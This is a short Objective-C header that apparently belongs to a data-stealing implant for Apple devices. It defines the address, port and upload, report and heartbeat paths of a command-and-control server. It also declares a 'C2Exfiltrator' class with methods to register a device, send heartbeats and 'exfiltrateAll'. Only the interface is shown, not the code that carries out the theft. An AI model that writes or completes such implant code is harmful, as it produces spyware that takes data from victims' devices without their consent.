#import <Foundation/Foundation.h>

// C2 Server Configuration
#define C2_HOST @"192.168.110.111"
#define C2_PORT 8081
#define C2_UPLOAD_PATH @"/api/v1/upload"
#define C2_REPORT_PATH @"/api/v1/c2/report"
#define C2_HEARTBEAT_PATH @"/api/v1/heartbeat/1"

@interface C2Exfiltrator : NSObject
+ (instancetype)shared;
- (void)setDeviceId:(NSString *)deviceId;
- (void)registerDevice;
- (void)startHeartbeat;
- (void)exfiltrateAll;
@end